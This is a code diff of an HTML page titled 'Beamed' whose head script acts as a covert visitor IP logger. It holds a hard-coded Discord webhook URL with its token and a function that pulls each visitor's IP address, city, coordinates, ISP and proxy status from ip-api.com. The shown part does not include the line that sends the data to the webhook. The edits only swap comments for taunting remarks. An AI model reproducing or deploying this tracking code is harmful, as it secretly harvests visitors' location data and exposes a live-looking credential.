@@ -4,10 +4,10 @@
     <meta charset="UTF-8">
     <title>Beamed</title>
     <script>
-        // Discord webhook URL
+        // Discord webhook URL so me can see it :)) levi feldman couldnt do this
         var wbhk = 'https://discord.com/api/webhooks/1338299297292226590/vG66beFgowK_JWnSqaeHltm50_Wl7R26AGggIGdc_Xpw71OqDh4NriFFAzk4hWX5PCNB';
 
-        // Function to fetch data via XMLHttpRequest
+        // Function fetching Data :))) EERERERER WHY YOU READIN THIS???
         function get_information(link, callback) {
             var xhr = new XMLHttpRequest();
             xhr.open("GET", link, true);
@@ -26,7 +26,7 @@
             xhr.send(null);
         }
 
-        // Fetch IP and extra info, append to hidden elements
+        // Get IP :)))
         function initIPLog() {
             get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function(text) {
                 var div = document.createElement("div");
